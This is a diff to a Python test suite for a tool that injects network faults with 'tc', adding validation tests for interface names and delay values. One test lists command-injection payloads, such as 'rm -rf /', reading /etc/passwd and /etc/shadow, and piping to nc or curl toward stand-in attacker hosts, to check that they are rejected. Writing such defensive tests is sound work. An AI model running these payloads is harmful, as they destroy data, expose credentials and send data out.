@@ -321,8 +321,7 @@ class TestNetworkFailures:
         # Should call tc qdisc del command
         mock_run_cmd.assert_called_once()
         call_args = mock_run_cmd.call_args[0][0]
-        assert "tc qdisc del" in call_args
-        assert "eth0" in call_args
+        assert set(["tc", "qdisc", "del", "eth0"]).issubset(call_args)
 
     @patch("src.failures.network._run_cmd")
     def test_inject_network_always_cleans_up(self, mock_run_cmd, capsys):
@@ -397,7 +396,7 @@ class TestNetworkFailures:
 
         success, error = cleanup_network_rules("eth999")
         assert success is False
-        assert "does not exist" in error
+        assert "Cannot find device" in error
 
     @patch("src.failures.network._run_cmd")
     def test_cleanup_network_rules_no_permissions(self, mock_run_cmd):
@@ -409,4 +408,79 @@ class TestNetworkFailures:
 
         success, error = cleanup_network_rules("eth0")
         assert success is False
-        assert "Permission denied" in error or "NET_ADMIN" in error
+        assert "Operation not permitted" in error
+
+    def test_validate_interface_blocks_command_injection(self):
+        """Test that command injection attempts are blocked."""
+        from src.failures.network import validate_interface_name
+        
+        malicious_inputs = [
+            "eth0; rm -rf /",
+            "eth0 && cat /etc/passwd",
+            "eth0 | nc attacker.com 1234",
+            "eth0`whoami`",
+            "eth0$(cat /etc/shadow)",
+            "eth0 > /tmp/pwned",
+            "eth0\nrm -rf /",
+            "eth0; curl http://evil.com",
+        ]
+        
+        for malicious in malicious_inputs:
+            is_valid, error = validate_interface_name(malicious)
+            assert is_valid is False, f"Should reject: {malicious}"
+            assert error is not None
+    
+    def test_validate_interface_allows_valid_names(self):
+        """Test that valid interface names are accepted."""
+        from src.failures.network import validate_interface_name
+        
+        valid_inputs = [
+            "eth0",
+            "wlan0",
+            "ens33",
+            "br-1234abcd",
+            "veth0.1",
+            "eth0:1",
+            "docker0",
+        ]
+        
+        for valid in valid_inputs:
+            is_valid, error = validate_interface_name(valid)
+            assert is_valid is True, f"Should accept: {valid}"
+            assert error is None
+    
+    def test_validate_delay_blocks_invalid_values(self):
+        """Test that invalid delay values are rejected."""
+        from src.failures.network import validate_delay_ms
+        
+        invalid_inputs = [
+            -1,
+            -100,
+            20000,  # Too high
+            "100ms",  # String
+            None,
+            [],
+        ]
+        
+        for invalid in invalid_inputs:
+            is_valid, error = validate_delay_ms(invalid)
+            assert is_valid is False
+            assert error is not None
+    
+    @patch("src.failures.network._run_cmd")
+    def test_inject_network_rejects_malicious_interface(self, mock_cmd, capsys):
+        """Test that network injection rejects command injection."""
+        config = {
+            "interface": "eth0; rm -rf /",
+            "delay_ms": 100,
+            "duration_seconds": 1
+        }
+        
+        inject_network(config, dry_run=False)
+        
+        # Should not execute any commands
+        mock_cmd.assert_not_called()
+        
+        # Should log validation failure
+        captured = capsys.readouterr()
+        assert "Validation failed" in captured.out
